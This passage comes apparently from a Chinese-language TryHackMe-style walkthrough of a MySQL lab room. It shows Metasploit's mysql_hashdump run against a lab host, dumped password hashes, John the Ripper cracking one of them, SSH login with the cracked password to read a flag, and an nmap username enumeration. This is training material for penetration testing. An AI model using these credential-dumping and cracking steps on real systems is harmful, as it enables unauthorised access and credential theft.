<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   2</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">    \\_</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> action:</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> hashcat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">                    .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">                .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">       .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">      Use</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Hashcat</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   3</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">    \\_</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> action:</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> john</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">                       .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">                .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">       .</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">      Use</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> John</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> the</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Ripper</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Interact</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> with</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> a</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> module</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> by</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> name</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> or</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> index.</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> For</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> example</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> info</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> 3,</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> use</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 3</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> or</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> use</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary/analyze/crack_databases</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">After</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> interacting</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> with</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> a</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> module</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> you</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> can</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> manually</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> a</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ACTION</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> with</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ACTION</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &#39;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">john</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_schemadump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="hint-container details"><summary>再次，接下来就交给你了。设置相应的选项，执行漏洞利用。哪个非默认用户引起了你的注意？</summary><p><strong>答案</strong> <code>carl</code></p><p><strong>解析</strong> ：</p><ul><li>参数配置</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> PASSWORD</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> password</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">PASSWORD</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> password</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> RHOSTS</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">RHOSTS</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> set</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> USERNAME</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> root</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">USERNAME</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> =</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> root</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> options</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> run</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>结果</li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> run</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">+</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 10.10.58.132:3306 - Saving HashString as Loot: root:</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">+</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 10.10.58.132:3306 - Saving HashString as Loot: mysql.session:</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">+</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 10.10.58.132:3306 - Saving HashString as Loot: mysql.sys:</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">+</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 10.10.58.132:3306 - Saving HashString as Loot: debian-sys-maint:</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">+</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 10.10.58.132:3306 - Saving HashString as Loot: root:</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">+</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 10.10.58.132:3306 - Saving HashString as Loot: carl:</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">EA031893AA21444B170FC2162A56978B8CEECE18</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 10.10.58.132:3306 - Scanned 1 of 1 hosts (</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">100%</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> complete</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">)</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> Auxiliary module execution completed</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">msf6</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> auxiliary</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">scanner/mysql/mysql_hashdump</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> &gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>又一个用户！而且我们已经获取了他们的密码散列。这个密码散列信息可能非常有价值。请完整复制哈希字符串，例如：<code>bob:*HASH</code>，并将其保存到您本地机器上名为“hash.txt”的文本文件中。</p><details class="hint-container details"><summary>这个<code>user/hash</code>组合字符串是什么？</summary><p><strong>答案</strong> <code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></p></details><details class="hint-container details"><summary>现在，我们必须破解这个密码！让我们用<code>John the Ripper</code>工具来尝试破解，使用“<code>john hash.txt</code>”文件，我们找到的这个用户的密码是什么？</summary><p><strong>答案</strong> <code>doggie </code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">root@ip-10-10-17-70:~#</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> john</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  hash.txt</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Warning:</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> detected</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> hash</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> type</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">mysql-sha1</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">,</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> but</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> the</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> string</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> is</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> also</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> recognized</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> as</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">mysql-sha1-opencl</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Proceeding</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> with</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> incremental:ASCII</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">doggie</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">           (carl)</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">root@ip-10-10-17-70:~#</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>棒极了，密码重复使用不仅极其危险，而且极为普遍。这个用户将他们的密码用于其他服务的可能性有多大呢？</p><details class="hint-container details"><summary>关于<code>MySQL.txt</code>文件，它包含了哪些内容？</summary><p><strong>答案</strong> <code>THM{congratulations_you_got_the_mySQL_flag}</code></p><p><strong>解析</strong>：</p><ul><li>登陆<code>ssh</code></li></ul><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">root@ip-10-10-17-70:~#</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ssh</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> carl@10.10.58.132</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">carl@10.10.58.132</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">&#39;s password:      #password: doggie</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>获取<code>flag</code></li></ul><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>carl@polomysql:~$ ls</span></span>
<span class="line"><span>MySQL.txt</span></span>
<span class="line"><span>carl@polomysql:~$ cat MySQL.txt </span></span>
<span class="line"><span>THM{congratulations_you_got_the_mySQL_flag}</span></span>
<span class="line"><span>carl@polomysql:~$</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="近一步学习" tabindex="-1"><a class="header-anchor" href="#近一步学习"><span>近一步学习</span></a></h2><p>这里有一些东西，如果你感兴趣，在完成这个房间后阅读可能会有用：</p><ul><li>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/ch-exploits</li><li>https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/</li></ul><h3 id="手动枚举" tabindex="-1"><a class="header-anchor" href="#手动枚举"><span>手动枚举</span></a></h3><h4 id="nmap脚本扫描mysql" tabindex="-1"><a class="header-anchor" href="#nmap脚本扫描mysql"><span>nmap脚本扫描mysql</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">nmap</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> --script=mysql-enum</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Host</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> is</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> up</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (0.00067s </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">latency</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">).</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">Not</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> shown:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 998</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> closed</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> ports</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">PORT</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">     STATE</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> SERVICE</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">22/tcp</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">   open</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  ssh</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">3306/tcp</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> open</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  mysql</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> mysql-enum:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">   Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> usernames:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     root:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     guest:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     netadmin:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     web:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">     test</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     sysadmin:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     administrator:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     webadmin:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     admin:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">     user:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&lt;empty&gt; </span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">-</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Valid</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> credentials</span></span>
